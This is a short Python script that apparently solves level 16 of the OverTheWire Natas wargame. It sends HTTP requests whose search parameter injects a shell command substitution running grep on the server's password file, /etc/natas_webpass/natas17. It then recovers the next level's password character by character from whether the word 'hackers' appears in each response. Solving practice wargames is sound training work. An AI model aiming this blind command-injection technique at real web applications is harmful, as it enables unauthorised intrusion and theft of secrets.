import requests
password = ""

a_pass = "natas_16_password"
a_user = "natas16"

for _ in range(34):
    for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
        url = f"http://natas16.natas.labs.overthewire.org/index.php?needle=%24%28grep+-E+%5E{password}{i}.*+%2Fetc%2Fnatas_webpass%2Fnatas17%29hackers&submit=Search"
        r = requests.get(url,auth=(a_user,a_pass))
        if "hackers" not in r.text:
            password += i
            break
print("the next level password is : ",password)
